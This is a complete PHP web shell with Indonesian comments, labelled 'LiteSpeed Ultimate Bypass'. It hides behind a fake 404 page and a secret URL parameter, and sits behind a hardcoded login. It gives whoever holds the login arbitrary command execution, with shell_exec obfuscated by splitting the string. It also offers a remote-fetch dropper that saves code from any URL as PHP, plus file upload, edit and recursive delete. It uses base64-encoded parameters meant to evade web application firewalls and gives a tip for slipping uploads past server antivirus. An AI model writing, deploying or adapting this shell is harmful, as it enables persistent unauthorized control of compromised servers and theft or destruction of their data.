<?php
session_start();

// Proteksi Parameter (Hanya bisa diakses dengan ?dugong)
if (!isset($_GET['dugong']) && !isset($_SESSION['dugong'])) {
    header("HTTP/1.0 404 Not Found");
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found</h1>\n<p>The requested URL was not found on this server.</p>\n</body></html>";
    exit;
}
$_SESSION['dugong'] = true;

$USERNAME = 'seobarbar';
$PASSWORD_HASH = '383ef99b31667b72d80a9ee472c5d87b6b986027';

// Obfuscation untuk Bypass WAF / LiteSpeed
function enc($b) { return urlencode(base64_encode($b)); }
function dec($b) { return base64_decode(str_replace(' ', '+', $b)); }

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . str_replace('?dugong', '', $_SERVER['REQUEST_URI']));
    exit;
}

if (!isset($_SESSION['loggedin'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if ($_POST['username'] === $USERNAME && sha1($_POST['password']) === $PASSWORD_HASH) {
            $_SESSION['loggedin'] = true;
            header('Location: ?dugong');
            exit;
        } else {
            $error = "Akses Ditolak!";
        }
    }
    echo '<!DOCTYPE html><html lang="en"><head><title>LiteSpeed Bypass</title><style>body{background:#111;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}.box{background:#1e1e1e;padding:20px;border-radius:10px;box-shadow:0 0 15px #0f0}input{background:#222;border:1px solid #555;color:#0f0;padding:5px;margin:5px 0;width:100%;box-sizing:border-box}button{background:#0f0;color:#111;border:none;padding:5px 10px;cursor:pointer;width:100%;font-weight:bold;margin-top:10px;}</style></head><body><div class="box"><h2><center>Login Shell</center></h2>'.(isset($error)?"<p style='color:red;text-align:center'>$error</p>":"").'<form method="post"><input type="text" name="username" placeholder="Username" required><br><input type="password" name="password" placeholder="Password" required><br><button type="submit">Enter</button></form></div></body></html>';
    exit;
}

// Decode all GET parameters automatically to bypass WAF (Dari litespeed3)
$decoded_get = [];
foreach ($_GET as $k => $v) {
    if ($k !== 'logout' && $k !== 'dugong') {
        $decoded_get[$k] = dec($v);
    }
}

$current_dir = isset($decoded_get['path']) ? realpath($decoded_get['path']) : getcwd();
if (!$current_dir || !is_dir($current_dir)) $current_dir = getcwd();

// Handle Actions (Hapus file/folder)
if (isset($decoded_get['delete'])) {
    $file = basename($decoded_get['delete']);
    $full = $current_dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($full)) unlink($full);
    elseif (is_dir($full)) {
        // Recursive delete
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($full, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            $todo($fileinfo->getRealPath());
        }
        rmdir($full);
    }
    header('Location: ?dugong&path=' . enc($current_dir));
    exit;
}

// Upload File (Dari shell-litespeed4)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $err = $_FILES['upload']['error'];
    if ($err === UPLOAD_ERR_OK) {
        $filename = basename($_FILES['upload']['name']);
        $dest = rtrim($current_dir, '/\\') . DIRECTORY_SEPARATOR . $filename;
        if (@move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            echo "<div class='box alert'>✅ Upload Success: ".htmlspecialchars($filename)."</div>";
        } else {
            echo "<div class='box' style='color:red;'>❌ Upload Failed! File temporary '/tmp/...' tidak ditemukan. Kemungkinan besar file dihapus otomatis oleh Anti-Virus (Imunify360/CXS) saat berada di folder /tmp. Solusi: Upload file dengan ektensi .txt (contoh: zila500.txt), lalu Rename menjadi .php setelah berhasil diupload.</div>";
        }
    } else {
        echo "<div class='box' style='color:red;'>❌ Upload Error Code: $err</div>";
    }
}

// Buat File / Folder Baru
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file']) && !empty($_POST['new_file'])) {
    file_put_contents($current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_file']), '');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    mkdir($current_dir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']));
}

// Fitur Remote Fetch (Kombinasi Dropper litespeed1 & litespeed2)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['remote_url']) && !empty($_POST['remote_url'])) {
    $ch = curl_init($_POST['remote_url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $res = curl_exec($ch);
    if ($res !== false) {
        $save_as = !empty($_POST['remote_name']) ? basename($_POST['remote_name']) : 'remote_fetch.php';
        file_put_contents($current_dir . DIRECTORY_SEPARATOR . $save_as, $res);
    }
    curl_close($ch);
}

// Command Executor (Dari shell-litespeed4 & litespeed3)
$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $e = "sh"."ell_exec";
    if (function_exists($e)) {
        $output = $e($_POST['cmd'] . ' 2>&1');
    } else {
        $output = 'shell_exec disabled on this server.';
    }
}

// Get Server Info (Dari shell-litespeed4)
$server_ip = gethostbyname(gethostname());
$sys = php_uname();
$user = get_current_user();

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LiteSpeed Recommended Shell</title>
    <style>
        body { background:#1a1a1a; color:#fff; font-family:Courier New, monospace; padding:20px; }
        table { width:100%; border-collapse:collapse; margin-top:10px; }
        th, td { border:1px solid #333; padding:8px; text-align:left; }
        a { color:#0f0; text-decoration:none; }
        a:hover { color:#fff; text-decoration: underline; }
        .box { background:#1e1e1e; border:1px solid #333; padding:15px; border-radius:5px; margin-bottom:15px; }
        .btn { background:#222; color:#0f0; border:1px solid #0f0; padding:5px 10px; cursor:pointer; font-family: monospace; }
        .btn:hover { background:#0f0; color:#000; }
        input[type="text"] { background:#111; color:#0f0; border:1px solid #555; padding:5px; font-family: monospace; }
        input[type="file"] { color: #aaa; }
        .info { color: #aaa; font-size: 0.9em; margin-bottom: 10px; }
        .info span { color: #0f0; }
        .alert { color: limegreen; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>LiteSpeed Ultimate Bypass <a href="?dugong&logout=1" style="float:right;color:red;font-size:14px;">[Logout]</a></h2>
        <div class="info">
            System: <span><?=$sys?></span> | User: <span><?=$user?></span> | Server IP: <span><?=$server_ip?></span>
        </div>
        <div style="margin-top:10px; background:#111; padding:10px; border:1px solid #333;">
            Path: 
            <?php
            $path_display = str_replace('\\', '/', $current_dir);
            $paths = explode('/', $path_display);
            
            $build = '';
            if (strpos($path_display, '/') === 0) {
                $build = '/';
                echo '<a href="?dugong&path='.enc($build).'" style="color:gold;">/</a> ';
            }
            
            foreach ($paths as $p) {
                if ($p === '') continue;
                
                if ($build === '' || $build === '/') {
                    $build .= $p;
                    // Jika drive Windows (contoh: C:), tambahkan slash agar valid
                    if (substr($p, -1) === ':') {
                        $build .= '/';
                    }
                } else {
                    $build .= (substr($build, -1) === '/' ? '' : '/') . $p;
                }
                echo '<a href="?dugong&path='.enc($build).'" style="color:gold;">'.$p.'</a> / ';
            }
            ?>
        </div>
    </div>

    <div class="box">
        <form method="post" enctype="multipart/form-data" style="display:inline-block; margin-right:15px;">
            Upload: <input type="file" name="upload" required> <button type="submit" class="btn">Upload</button>
        </form>
        <span style="border-left: 1px solid #333; margin: 0 10px;"></span>
        <form method="post" style="display:inline-block;">
            Remote Fetch: <input type="text" name="remote_url" placeholder="URL Raw Script">
            <input type="text" name="remote_name" placeholder="Save As (e.g. shell.php)">
            <button type="submit" class="btn">Fetch</button>
        </form>
    </div>

    <div class="box">
        <form method="post" style="display:inline-block; margin-right:15px;">
            New File: <input type="text" name="new_file" placeholder="filename.php"> <button type="submit" class="btn">Create</button>
        </form>
        <span style="border-left: 1px solid #333; margin: 0 10px;"></span>
        <form method="post" style="display:inline-block;">
            New Folder: <input type="text" name="new_folder" placeholder="folder_name"> <button type="submit" class="btn">Create</button>
        </form>
    </div>

    <div class="box">
        <form method="post">
            Terminal: <input type="text" name="cmd" style="width:60%;" placeholder="ls -la"> <button type="submit" class="btn">Run</button>
        </form>
        <?php if($output): ?>
            <pre style="background:#000; padding:10px; color:#0f0; margin-top:10px; border:1px solid #333; overflow-x:auto;"><?=$output?></pre>
        <?php endif; ?>
    </div>

    <?php
    if (isset($decoded_get['edit'])) {
        $edit_file = $current_dir . DIRECTORY_SEPARATOR . basename($decoded_get['edit']);
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
            file_put_contents($edit_file, $_POST['file_content']);
            echo "<div class='box alert'>✅ File successfully saved!</div>";
        }
        $content = htmlspecialchars(file_get_contents($edit_file));
        echo '<div class="box"><h3><span style="color:#aaa;">Edit File:</span> '.basename($edit_file).'</h3>';
        echo '<form method="post"><textarea name="file_content" style="width:100%;height:400px;background:#111;color:#0f0;border:1px solid #333;font-family:monospace;padding:10px;box-sizing:border-box;">'.$content.'</textarea><br><button type="submit" class="btn" style="margin-top:10px;">Save Changes</button> <a href="?dugong&path='.enc($current_dir).'" class="btn" style="display:inline-block;margin-top:10px;text-align:center;width:60px;">Back</a></form></div>';
    } else {
    ?>

    <table>
        <tr style="background:#222;">
            <th>Name</th>
            <th>Size</th>
            <th>Perms</th>
            <th>Action</th>
        </tr>
        <?php
        $scandir = scandir($current_dir);
        
        // Pisahkan folder dan file
        $folders = [];
        $files = [];
        foreach ($scandir as $file) {
            if ($file === '.') continue; // Sembunyikan direktori saat ini (.)
            $full = $current_dir . DIRECTORY_SEPARATOR . $file;
            
            // Khusus untuk '..', set path ke dirname($current_dir)
            if ($file === '..') {
                $folders['..'] = dirname($current_dir);
                continue;
            }
            
            if (is_dir($full)) $folders[$file] = $full;
            else $files[] = $file;
        }
        
        // Print Folders first
        foreach ($folders as $file => $full_path) {
            if ($file === '..') {
                echo "<tr style='background:#1a1a1a;'>";
                echo "<td><a href='?dugong&path=".enc($full_path)."' style='color:gold;'>[DIR] .. (Up)</a></td>";
                echo "<td>-</td><td>-</td><td>-</td>";
                echo "</tr>";
                continue;
            }
            $perms = substr(sprintf('%o', fileperms($full_path)), -4);
            $perm_color = is_writable($full_path) ? 'limegreen' : 'red';
            echo "<tr style='background:#1a1a1a;'>";
            echo "<td><a href='?dugong&path=".enc($full_path)."' style='color:gold;'>[DIR] $file</a></td>";
            echo "<td>-</td>";
            echo "<td style='color:$perm_color'>$perms</td>";
            echo "<td><a href='?dugong&path=".enc($current_dir)."&delete=".enc($file)."' onclick='return confirm(\"Hapus folder ini?\")' style='color:#ff5555;'>[Delete]</a></td>";
            echo "</tr>";
        }
        
        // Print Files
        foreach ($files as $file) {
            $full = $current_dir . DIRECTORY_SEPARATOR . $file;
            $size = filesize($full);
            $perms = substr(sprintf('%o', fileperms($full)), -4);
            $perm_color = is_writable($full) ? 'limegreen' : 'red';
            echo "<tr>";
            echo "<td>$file</td>";
            echo "<td>$size bytes</td>";
            echo "<td style='color:$perm_color'>$perms</td>";
            echo "<td>";
            echo "<a href='?dugong&path=".enc($current_dir)."&edit=".enc($file)."' style='color:#0f0;'>[Edit]</a> ";
            echo "<a href='?dugong&path=".enc($current_dir)."&delete=".enc($file)."' onclick='return confirm(\"Hapus file ini?\")' style='color:#ff5555;'>[Delete]</a>";
            echo "</td>";
            echo "</tr>";
        }
        ?>
    </table>
    <?php } ?>
</body>
</html>
